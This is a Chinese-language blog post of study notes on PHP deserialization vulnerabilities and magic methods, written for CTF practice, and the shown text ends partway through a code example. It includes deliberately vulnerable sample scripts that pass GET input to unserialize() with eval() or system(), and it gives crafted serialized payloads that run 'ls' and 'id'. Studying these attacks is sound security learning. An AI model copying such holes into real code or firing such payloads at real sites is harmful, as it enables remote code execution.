{"title":"php反序列化漏洞学习","uid":"27a8c82d6074b44b0feedf4a65c9f85a","slug":"php反序列化漏洞学习","date":"2023-02-11T02:27:57.686Z","updated":"2023-02-13T12:41:05.845Z","comments":true,"path":"api/articles/php反序列化漏洞学习.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/wallhaven-2y85z9.png","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>php反序列化漏洞一直是自己的一个弱项，想到上次ctf比赛就是因为web的最后一道题是php反序列化没有思路导致成绩不太理想，特此做个学习笔记以便自己以后查阅</p>\n<h1 id=\"php面向对象基本概念\"><a href=\"#php面向对象基本概念\" class=\"headerlink\" title=\"php面向对象基本概念\"></a>php面向对象基本概念</h1><h2 id=\"面向对象\"><a href=\"#面向对象\" class=\"headerlink\" title=\"面向对象\"></a>面向对象</h2><p>首先要明确面向对象程序开发的概念</p>\n<p><strong>面向过程：</strong></p>\n<p>面向过程是一种以“整体事件” 为中心的编程思想，编程的时候把解决问题的步骤分析出来,，然后用函数把这些步骤实现，在一步一步的具体步骤中再按顺序调用函数。</p>\n<p><strong>面向对象：</strong></p>\n<p>面向对象是一种以“对象”为中心的编程思想，把要解决的问题分解成各个“对象”;</p>\n<p>对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。</p>\n<p><strong>对象的三个特征</strong>：对象的行为，对象的形态，对象的表示</p>\n<h2 id=\"类的定义\"><a href=\"#类的定义\" class=\"headerlink\" title=\"类的定义\"></a>类的定义</h2><p>类是定义了一件事物的抽象特点，它将数据的形式以及这些数据上的操作封装在一起。</p>\n<p>对象是具有类类型的变量，是对类的实例。</p>\n<p><strong>内部构成：</strong>成员变量（属性）+成员函数（方法）</p>\n<p>变量定义在类里面就叫成员属性</p>\n<p>在类外面叫成员函数，在类里面叫成员方法</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230211104546622.png\" alt=\"image-20230211104546622\"></p>\n<p><strong>继承：</strong>继承性是子类自动共享父类数据结构和方法的机制，是类之间的一种关系。</p>\n<p>在定义和实现一个类的时候，可以在一一个已经存在的类的基础之上来进行，把一个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</p>\n<p><strong>父类：</strong>一个类被其他类继承，可将该类成为父类，或基类，超类</p>\n<p><strong>子类：</strong>一个类继承其他类称为子类，也可以称为派生类</p>\n<h1 id=\"类与对象\"><a href=\"#类与对象\" class=\"headerlink\" title=\"类与对象\"></a>类与对象</h1><h2 id=\"类的结构\"><a href=\"#类的结构\" class=\"headerlink\" title=\"类的结构\"></a>类的结构</h2><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230211105735767.png\" alt=\"image-20230211105735767\"></p>\n<p>其实类里面应该还有成员常量的，但因为我学这个不是搞开发，所以用到的成员常量不多，就不做了解</p>\n<h2 id=\"类的内容\"><a href=\"#类的内容\" class=\"headerlink\" title=\"类的内容\"></a>类的内容</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">class hero  &#x2F;&#x2F;定义类（类名）\n&#123;\n    &#x2F;&#x2F;声明成员变量\n\tvar $name; &#x2F;&#x2F;var为一种修饰符，先不管，默认是public\n\tvar $sex;\n    &#x2F;&#x2F;声明成员函数（方法）\n\tfunction jineng($var1)\n\t&#123;\n\t\techo $this-&gt;name;  &#x2F;&#x2F;使用预定义$this调用成员变量\n\t\techo $var1;  &#x2F;&#x2F;成员函数传参$var1可直接调用\n\t&#125;\n&#125;</code></pre>\n\n<h2 id=\"实例化和赋值\"><a href=\"#实例化和赋值\" class=\"headerlink\" title=\"实例化和赋值\"></a>实例化和赋值</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nhighlight_file(__FILE__);\nclass hero&#123;\n  var $name;\n  var $sex;\n  function jineng($var1) &#123;\n    echo $this-&gt;name.&quot;&lt;br &#x2F;&gt;&quot;;\n    echo $var1.&quot;&lt;br &#x2F;&gt;&quot;;\n    &#125;\n&#125;\n\n$cyj&#x3D; new hero();  &#x2F;&#x2F;实体化成对象\n$cyj-&gt;name&#x3D;&#39;chengyaojin&#39;;  &#x2F;&#x2F;赋值\n$cyj-&gt;sex&#x3D;&#39;man&#39;;\n$cyj-&gt;jineng(&#39;zuofan&#39;);\nprint_r($cyj); &#x2F;&#x2F;对象不能使用echo输出，要么用print_r，要么用var_dump\n\n?&gt;</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230211154129927.png\" alt=\"image-20230211154129927\"></p>\n<h2 id=\"类的修饰符介绍\"><a href=\"#类的修饰符介绍\" class=\"headerlink\" title=\"类的修饰符介绍\"></a>类的修饰符介绍</h2><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230211154143382.png\" alt=\"image-20230211154143382\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230211154347251.png\" alt=\"image-20230211154347251\"></p>\n<p>代码演示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nhighlight_file(__FILE__);\nclass hero&#123;\n  public  $name&#x3D;&#39;chengyaojin&#39;;  &#x2F;&#x2F;公共的\n  private  $sex&#x3D;&#39;man&#39;;  &#x2F;&#x2F;私有的，别人看不到\n  protected  $shengao&#x3D;&#39;165&#39;;  &#x2F;&#x2F;受保护的：内部，子类可用\n  function jineng($var1) &#123;\n    echo $this-&gt;name;\n    echo $var1;\n    &#125;\n&#125;\n$cyj&#x3D; new hero();\necho $cyj-&gt;name.&quot;&lt;br &#x2F;&gt;&quot;;  &#x2F;&#x2F;可以调用成功\necho $cyj-&gt;sex.&quot;&lt;br &#x2F;&gt;&quot;;  &#x2F;&#x2F;不能调用成功\necho $cyj-&gt;shengao.&quot;&lt;br &#x2F;&gt;&quot;;  &#x2F;&#x2F;不能调用成功\n?&gt;</code></pre>\n\n<p>结果：</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230211154453315.png\" alt=\"image-20230211154453315\"></p>\n<p>代码演示2</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nhighlight_file(__FILE__);\nclass hero&#123;\n  public  $name&#x3D;&#39;chengyaojin&#39;; &#x2F;&#x2F;公共的\n  private  $sex&#x3D;&#39;man&#39;;  &#x2F;&#x2F;私有的\n  protected  $shengao&#x3D;&#39;165&#39;;  &#x2F;&#x2F;受保护的：内部，子类可用\n  function jineng($var1) &#123;\n    echo $this-&gt;name;\n    echo $var1;\n    &#125;\n&#125;\n&#x2F;&#x2F;子类\nclass hero2 extends hero&#123;\n    function test()&#123;\n    echo $this-&gt;name.&quot;&lt;br &#x2F;&gt;&quot;;  &#x2F;&#x2F;子类可用\n    echo $this-&gt;sex.&quot;&lt;br &#x2F;&gt;&quot;;  &#x2F;&#x2F;子类不可用\n    echo $this-&gt;shengao.&quot;&lt;br &#x2F;&gt;&quot;;  &#x2F;&#x2F;子类可用\n    &#125;\n&#125;\n$cyj&#x3D; new hero();\n$cyj2&#x3D;new hero2();\necho $cyj-&gt;name.&quot;&lt;br &#x2F;&gt;&quot;;  &#x2F;&#x2F;外部之可用public\necho $cyj2-&gt;test();  &#x2F;&#x2F;子类内部可用public和protected\n?&gt;</code></pre>\n\n<p>结果：</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230211154821035.png\" alt=\"image-20230211154821035\"></p>\n<h2 id=\"类的成员方法\"><a href=\"#类的成员方法\" class=\"headerlink\" title=\"类的成员方法\"></a>类的成员方法</h2><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230211155715902.png\" alt=\"image-20230211155715902\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>类是对象的抽象，而对象是类的具体实例</p>\n<p>类是想法，把类实例化（new），调用具体值后就变成了对象</p>\n<h1 id=\"序列化基础知识\"><a href=\"#序列化基础知识\" class=\"headerlink\" title=\"序列化基础知识\"></a>序列化基础知识</h1><h2 id=\"序列化的作用\"><a href=\"#序列化的作用\" class=\"headerlink\" title=\"序列化的作用\"></a>序列化的作用</h2><p>序列化(Serialization)是将对象的状态信息(属性)转换为可以存储或传输的形式的过程。</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230211160302565.png\" alt=\"image-20230211160302565\"></p>\n<p>将对象或者数组转化为可储存&#x2F;传输的字符串。</p>\n<p>在php中使用函数<code>serialize()</code>来将对象或者数组进行序列化，并返回一个包含字节流的字符串来表示</p>\n<h3 id=\"表达方式\"><a href=\"#表达方式\" class=\"headerlink\" title=\"表达方式\"></a>表达方式</h3><p>代码：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nhighlight_file(__FILE__);\nclass TEST &#123;\n    public $data;\n    public $data2 &#x3D; &quot;dazzhuang&quot;;\n    private $pass;\n\n    public function __construct($data, $pass)\n    &#123;\n        $this-&gt;data &#x3D; $data;\n        $this-&gt;pass &#x3D; $pass;\n    &#125;\n&#125;\n$number &#x3D; 34;\n$str &#x3D; &#39;user&#39;;\n$bool &#x3D; true;\n$null &#x3D; NULL;\n$arr &#x3D; array(&#39;a&#39; &#x3D;&gt; 10, &#39;b&#39; &#x3D;&gt; 200);\n$test &#x3D; new TEST(&#39;uu&#39;, true);\n$test2 &#x3D; new TEST(&#39;uu&#39;, true);\n$test2-&gt;data &#x3D; &amp;$test2-&gt;data2;\necho serialize($number).&quot;&lt;br &#x2F;&gt;&quot;;\necho serialize($str).&quot;&lt;br &#x2F;&gt;&quot;;\necho serialize($bool).&quot;&lt;br &#x2F;&gt;&quot;;\necho serialize($null).&quot;&lt;br &#x2F;&gt;&quot;;\necho serialize($arr).&quot;&lt;br &#x2F;&gt;&quot;;\necho serialize($test).&quot;&lt;br &#x2F;&gt;&quot;;\necho serialize($test2).&quot;&lt;br &#x2F;&gt;&quot;;\n?&gt;</code></pre>\n\n<p>结果：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">i:34;\ns:4:&quot;user&quot;;\nb:1;\nN;\na:2:&#123;s:1:&quot;a&quot;;i:10;s:1:&quot;b&quot;;i:200;&#125;\nO:4:&quot;TEST&quot;:3:&#123;s:4:&quot;data&quot;;s:2:&quot;uu&quot;;s:5:&quot;data2&quot;;s:9:&quot;dazzhuang&quot;;s:10:&quot;TESTpass&quot;;b:1;&#125;\nO:4:&quot;TEST&quot;:3:&#123;s:4:&quot;data&quot;;s:9:&quot;dazzhuang&quot;;s:5:&quot;data2&quot;;R:2;s:10:&quot;TESTpass&quot;;b:1;&#125;</code></pre>\n\n<p>说明：</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230211161117179.png\" alt=\"image-20230211161117179\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230211161345011.png\" alt=\"image-20230211161345011\"></p>\n<p><strong>对象序列化：</strong></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230211162214049.png\" alt=\"image-20230211162214049\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230211164859169.png\" alt=\"image-20230211164859169\"></p>\n<p>不同的修饰符序列化后的表达都不同，这里的%00其实是url编码过后的二进制00，事实上就是加了一个空</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nhighlight_file(__FILE__);\nclass test&#123;\n    private $pub&#x3D;&#39;benben&#39;;\n    function jineng()&#123;\n        echo $this-&gt;pub;\n    &#125;\n&#125;\n$a &#x3D; new test();\necho serialize($a);\n?&gt;</code></pre>\n\n<p>在编译器里直接运行上段代码可以看到，属性名前面有乱码，这里其实就是加了二进制的00</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230211165055745.png\" alt=\"image-20230211165055745\"></p>\n<p>url编码一下再输出，就可以直观的看到了</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230211165358927.png\" alt=\"image-20230211165358927\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230211165414581.png\" alt=\"image-20230211165414581\"></p>\n<h1 id=\"反序列化的知识\"><a href=\"#反序列化的知识\" class=\"headerlink\" title=\"反序列化的知识\"></a>反序列化的知识</h1><h2 id=\"特性\"><a href=\"#特性\" class=\"headerlink\" title=\"特性\"></a>特性</h2><p><strong>1.反序列化之后的内容为一个对象</strong></p>\n<p><strong>2.反序列化生成的对象里面的值，由反序列化里的值提供；与原有类预定的值无关</strong></p>\n<p><strong>3.反序列化不触发类的成员方法；需要调用方法后才能触发</strong></p>\n<h2 id=\"反序列化的作用\"><a href=\"#反序列化的作用\" class=\"headerlink\" title=\"反序列化的作用\"></a>反序列化的作用</h2><p>将序列化后的参数还原成实例化的对象</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213142700650.png\" alt=\"image-20230213142700650\"></p>\n<p>1.反序列化之后的内容为一个对象</p>\n<p>代码演示：</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213143548797.png\" alt=\"image-20230213143548797\"></p>\n<p>2.反序列化生成的对象里面的值，由反序列化里的值提供；与原有类预定的值无关</p>\n<p>代码演示：</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213143848261.png\" alt=\"image-20230213143848261\"></p>\n<p>3.反序列化不触发类的成员方法；需要调用方法后才能触发</p>\n<p>代码演示：</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213144224641.png\" alt=\"image-20230213144224641\"></p>\n<h1 id=\"反序列化漏洞利用\"><a href=\"#反序列化漏洞利用\" class=\"headerlink\" title=\"反序列化漏洞利用\"></a>反序列化漏洞利用</h1><p>前面提到，<strong>反序列化生成的对象里面的值，由反序列化里的值提供；与原有类预定的值无关</strong></p>\n<p>反序列化漏洞的成因：反序列化过程中，unserialie()接收的值 (字符串)可控;通过更改这个值(字符串)，得到所需要的代码，即生成的对象的属性值。</p>\n<p>然后根据<strong>反序列化不触发类的成员方法；需要调用方法后才能触发</strong>，通过调用方法，触发代码执行</p>\n<p>例题源码：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass test&#123;\n    public $a &#x3D; &#39;echo &quot;this is test!!&quot;;&#39;;\n    public function displayVar() &#123;\n        eval($this-&gt;a);\n    &#125;\n&#125;\n\n$get &#x3D; $_GET[&quot;benben&quot;];\n$b &#x3D; unserialize($get);\n$b-&gt;displayVar() ;\n\n?&gt;</code></pre>\n\n<p>构造漏洞利用代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\n\nclass test&#123;\n    public $a &#x3D; &#39;system(&quot;ls&quot;);&#39;;\n    public function displayVar() &#123;\n        eval($this-&gt;a);\n    &#125;\n&#125;\n\n$a &#x3D;new test();\necho serialize($a);</code></pre>\n\n<p>得到payload：<code>O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:13:&quot;system(&quot;ls&quot;);&quot;;&#125;</code></p>\n<p>最后执行</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213151319388.png\" alt=\"image-20230213151319388\"></p>\n<h1 id=\"魔术方法简介\"><a href=\"#魔术方法简介\" class=\"headerlink\" title=\"魔术方法简介\"></a>魔术方法简介</h1><h2 id=\"什么是魔术方法？\"><a href=\"#什么是魔术方法？\" class=\"headerlink\" title=\"什么是魔术方法？\"></a>什么是魔术方法？</h2><p>一个预定义好的，在特定情况下自动触发的行为方法</p>\n<p>通俗的说就是在执行了某个动作之前或者之后会触发的动作</p>\n<h2 id=\"魔术方法的作用\"><a href=\"#魔术方法的作用\" class=\"headerlink\" title=\"魔术方法的作用\"></a>魔术方法的作用</h2><p>反序列化漏洞的成因:反序列化过程中，unserialize()接收的值 (字符串)可控;通过更改这个值(字符串)， 得到所需要的代码;通过调用方法，触发代码执行。</p>\n<p>魔术方法在特定条件下自动调用相关方法。最终导致触发代码</p>\n<h2 id=\"魔术方法相关机制\"><a href=\"#魔术方法相关机制\" class=\"headerlink\" title=\"魔术方法相关机制\"></a>魔术方法相关机制</h2><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213152348583.png\" alt=\"image-20230213152348583\"></p>\n<p><strong>触发时机最为重要</strong>，一定要掌握</p>\n<h2 id=\"魔术方法的简单分类\"><a href=\"#魔术方法的简单分类\" class=\"headerlink\" title=\"魔术方法的简单分类\"></a>魔术方法的简单分类</h2><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213152806363.png\" alt=\"image-20230213152806363\"></p>\n<h2 id=\"construct\"><a href=\"#construct\" class=\"headerlink\" title=\"_construct()\"></a>_construct()</h2><p>构造函数，在实例化一个对象的时候，首先会去自动执行的一一个方法</p>\n<p>触发时机:实例化对象</p>\n<p>功能:提前清理不必要内容</p>\n<p>参数:非必要</p>\n<p>返回值:</p>\n<p>演示代码：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nhighlight_file(__FILE__);\nclass User &#123;\n    public $username;\n    public function __construct($username) &#123;\n        $this-&gt;username &#x3D; $username;\n        echo &quot;触发了构造函数1次&quot; ;\n    &#125;\n&#125;\n$test &#x3D; new User(&quot;benben&quot;);  &#x2F;&#x2F;实例化对象时触发构造函数_ construct()\n$ser &#x3D; serialize($test);\nunserialize($ser);\n\n?&gt;\n    \n&#x2F;&#x2F;结果：只触发了一次</code></pre>\n\n<p><strong>在实例化对象时触发，在序列化和反序列化过程中不会触发</strong></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213154307872.png\" alt=\"image-20230213154307872\"></p>\n<h2 id=\"destruct\"><a href=\"#destruct\" class=\"headerlink\" title=\"_destruct\"></a>_destruct</h2><p>析构函数，在 用被删除或者当对象被显式销毁时执行的魔术方法</p>\n<p>触发时机:对象引用完成,或对象被销毁</p>\n<p>代码演示：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nhighlight_file(__FILE__);\nclass User &#123;\n    public function __destruct()\n    &#123;\n        echo &quot;触发了析构函数1次&quot;.&quot;&lt;br &#x2F;&gt;&quot; ;\n    &#125;\n&#125;\n$test &#x3D; new User(&quot;benben&quot;);  &#x2F;&#x2F;实例化对象结束后，代码运行完会销毁，触发析构函数_ destruct()\n$ser &#x3D; serialize($test);\nunserialize($ser);  &#x2F;&#x2F;在反序列化过程中会触发\n\n?&gt;\n&#x2F;&#x2F;触发了析构函数1次\n&#x2F;&#x2F;触发了析构函数1次</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213155410272.png\" alt=\"image-20230213155410272\"></p>\n<p>简单例题</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    var $cmd &#x3D; &quot;echo &#39;dazhuang666!!&#39;;&quot; ;\n    public function __destruct()\n    &#123;\n        eval ($this-&gt;cmd);\n    &#125;\n&#125;\n$ser &#x3D; $_GET[&quot;benben&quot;];\nunserialize($ser);\n\n?&gt;</code></pre>\n\n<p>运行结果</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213154958899.png\" alt=\"image-20230213154958899\"></p>\n<h2 id=\"sleep\"><a href=\"#sleep\" class=\"headerlink\" title=\"_sleep()\"></a>_sleep()</h2><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213155612991.png\" alt=\"image-20230213155612991\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213160545280.png\" alt=\"image-20230213160545280\"></p>\n<p>代码演示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nhighlight_file(__FILE__);\nclass User &#123;\n    const SITE &#x3D; &#39;uusama&#39;;\n    public $username;\n    public $nickname;\n    private $password;\n    public function __construct($username, $nickname, $password)    &#123;\n        $this-&gt;username &#x3D; $username;\n        $this-&gt;nickname &#x3D; $nickname;\n        $this-&gt;password &#x3D; $password;\n    &#125;\n    public function __sleep() &#123;\n        return array(&#39;username&#39;, &#39;nickname&#39;);\n    &#125;\n&#125;\n$user &#x3D; new User(&#39;a&#39;, &#39;b&#39;, &#39;c&#39;);\necho serialize($user);\n?&gt;\n\n&#x2F;&#x2F; O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;</code></pre>\n\n<h2 id=\"wakeup\"><a href=\"#wakeup\" class=\"headerlink\" title=\"_wakeup\"></a>_wakeup</h2><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213161310146.png\" alt=\"image-20230213161310146\"></p>\n<p>代码演示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    const SITE &#x3D; &#39;uusama&#39;;\n    public $username;\n    public $nickname;\n    private $password;\n    private $order;\n    public function __wakeup() &#123;\n        $this-&gt;password &#x3D; $this-&gt;username;\n    &#125;\n&#125;\n$user_ser &#x3D; &#39;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#39;;\nvar_dump(unserialize($user_ser));\n?&gt;\n&#x2F;&#x2F;object(User)#1 (4) &#123; [&quot;username&quot;]&#x3D;&gt; string(1) &quot;a&quot; [&quot;nickname&quot;]&#x3D;&gt; string(1) &quot;b&quot; [&quot;password&quot;:&quot;User&quot;:private]&#x3D;&gt; string(1) &quot;a&quot; [&quot;order&quot;:&quot;User&quot;:private]&#x3D;&gt; NULL &#125;</code></pre>\n\n<p>例题</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    const SITE &#x3D; &#39;uusama&#39;;\n    public $username;\n    public $nickname;\n    private $password;\n    private $order;\n    public function __wakeup() &#123;\n        system($this-&gt;username);\n    &#125;\n&#125;\n$user_ser &#x3D; $_GET[&#39;benben&#39;];\nunserialize($user_ser);\n?&gt;</code></pre>\n\n<p>payload：<code>O:4:&quot;User&quot;:1:&#123;s:8:&quot;username&quot;;s:2:&quot;id&quot;;&#125;</code></p>\n<p>执行结果：</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213162827255.png\" alt=\"image-20230213162827255\"></p>\n<h2 id=\"toString-NaN\"><a href=\"#toString-NaN\" class=\"headerlink\" title=\"_toString()\"></a>_toString()</h2><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213164419245.png\" alt=\"image-20230213164419245\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    var $benben &#x3D; &quot;this is test!!&quot;;\n         public function __toString()\n         &#123;\n             return &#39;格式不对，输出不了!&#39;;\n          &#125;\n&#125;\n$test &#x3D; new User() ;\nprint_r($test);\necho &quot;&lt;br &#x2F;&gt;&quot;;\necho $test;  &#x2F;&#x2F;这里是把$test当成字符串输出了，导致_toString（）执行\n?&gt;\nUser Object ( [benben] &#x3D;&gt; this is test!! )\n格式不对，输出不了!</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213164445780.png\" alt=\"image-20230213164445780\"></p>\n<h2 id=\"invoke\"><a href=\"#invoke\" class=\"headerlink\" title=\"_invoke()\"></a>_invoke()</h2><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213164904017.png\" alt=\"image-20230213164904017\"></p>\n<p>代码演示</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213164853427.png\" alt=\"image-20230213164853427\"></p>\n<h1 id=\"错误调用相关魔术方法\"><a href=\"#错误调用相关魔术方法\" class=\"headerlink\" title=\"错误调用相关魔术方法\"></a>错误调用相关魔术方法</h1><h2 id=\"call\"><a href=\"#call\" class=\"headerlink\" title=\"_call()\"></a>_call()</h2><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213165223272.png\" alt=\"image-20230213165223272\"></p>\n<p>代码演示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    public function __call($arg1,$arg2)\n    &#123;\n        echo &quot;$arg1,$arg2[0]&quot;;\n          &#125;\n&#125;\n$test &#x3D; new User() ;\n$test -&gt; callxxx(&#39;a&#39;);\n?&gt;\n\ncallxxx,a</code></pre>\n\n<h2 id=\"callStatic\"><a href=\"#callStatic\" class=\"headerlink\" title=\"_callStatic()\"></a>_callStatic()</h2><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213165911487.png\" alt=\"image-20230213165911487\"></p>\n<p>代码演示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    public function __callStatic($arg1,$arg2)\n    &#123;\n        echo &quot;$arg1,$arg2[0]&quot;;\n          &#125;\n&#125;\n$test &#x3D; new User() ;\n$test::callxxx(&#39;a&#39;);\n?&gt;\n\ncallxxx,a</code></pre>\n\n<h2 id=\"get\"><a href=\"#get\" class=\"headerlink\" title=\"_get()\"></a>_get()</h2><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213170151070.png\" alt=\"image-20230213170151070\"></p>\n<p>代码演示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    public $var1;\n    public function __get($arg1)\n    &#123;\n        echo  $arg1;\n    &#125;\n&#125;\n$test &#x3D; new User() ;\n$test -&gt;var2;\n?&gt;\n\nvar2</code></pre>\n\n<h2 id=\"set\"><a href=\"#set\" class=\"headerlink\" title=\"_set()\"></a>_set()</h2><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213175150026.png\" alt=\"image-20230213175150026\"></p>\n<p>代码演示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    public $var1;\n    public function __set($arg1 ,$arg2)\n    &#123;\n        echo  $arg1.&#39;,&#39;.$arg2;\n    &#125;\n&#125;\n$test &#x3D; new User() ;\n$test -&gt;var2&#x3D;1;\n?&gt;\n\nvar2,1</code></pre>\n\n<h2 id=\"isset\"><a href=\"#isset\" class=\"headerlink\" title=\"_isset()\"></a>_isset()</h2><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213175457160.png\" alt=\"image-20230213175457160\"></p>\n<p>代码演示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    private $var;\n    public function __isset($arg1 )\n    &#123;\n        echo  $arg1;\n    &#125;\n&#125;\n$test &#x3D; new User() ;\nisset($test-&gt;var);\n?&gt;\n\nvar</code></pre>\n\n<h2 id=\"unset\"><a href=\"#unset\" class=\"headerlink\" title=\"_unset()\"></a>_unset()</h2><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213175554504.png\" alt=\"image-20230213175554504\"></p>\n<p>代码演示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    private $var;\n    public function __unset($arg1 )\n    &#123;\n        echo  $arg1;\n    &#125;\n&#125;\n$test &#x3D; new User() 